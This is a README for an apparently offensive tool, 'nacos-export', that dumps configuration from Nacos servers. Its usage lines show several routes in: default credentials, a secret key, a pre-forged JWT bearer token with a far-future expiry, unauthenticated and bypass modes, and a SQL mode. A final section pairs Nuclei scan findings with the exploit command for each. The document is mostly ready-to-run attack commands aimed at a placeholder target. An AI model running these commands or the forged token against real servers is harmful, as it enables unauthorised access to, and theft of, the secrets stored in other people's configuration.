# NACOS EXPORT

- ✅ 通过nacos账号密码导出配置
- ✅ 通过secretkey导出配置
- ✅ 通过token导出配置
- ✅ 通过unauth/bypass导出配置
- ✅ 导出配置数量统计
- ✅ 通过sql导出配置

## Use

考虑到NACOS部署方式不同，在设置目标路径时，指向`/v1`的上一级目录.

> 若要将将结果保存至文件，请通过重定向输出方式

```text
$ python3 nacos-export.py

 ______________
< Nacos Export >         @Author: Arm!tage
 --------------          @Version: v1.2.0
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

Usage:
    python3 nacos-export.py <URL> <USERNAME> <PASSWORD>
    python3 nacos-export.py <URL> secertkey <SECRETKEY>
    python3 nacos-export.py <URL> <TOKEN>
    python3 nacos-export.py <URL> bypass|unauth
    python3 nacos-export.py <URL> sql

Example:
    python3 nacos-export.py http://TARGET:8848/nacos nacos nacos
    python3 nacos-export.py http://TARGET:8848/nacos secretkey SecretKey012345678901234567890123456789012345678901234567890123456789
    python3 nacos-export.py http://TARGET:8848/nacos eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
    python3 nacos-export.py http://TARGET:8848/nacos unauth
    python3 nacos-export.py http://TARGET:8848/nacos sql
```

## Nuclei Template

- **nacos-default-login**
  - `python3 nacos-export.py http://TARGET:8848/nacos nacos nacos`
- **unauthenticated-nacos-access**
  - `python3 nacos-export.py http://TARGET:8848/nacos unauth`
  - `python3 nacos-export.py http://TARGET:8848/nacos bypass`
- **nacos-auth-bypass**
  - `python3 nacos-export.py http://TARGET:8848/nacos unauth`
  - `python3 nacos-export.py http://TARGET:8848/nacos bypass`
- **nacos-authentication-bypass:extracted-credentials**
  - `python3 nacos-export.py http://TARGET:8848/nacos eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g`
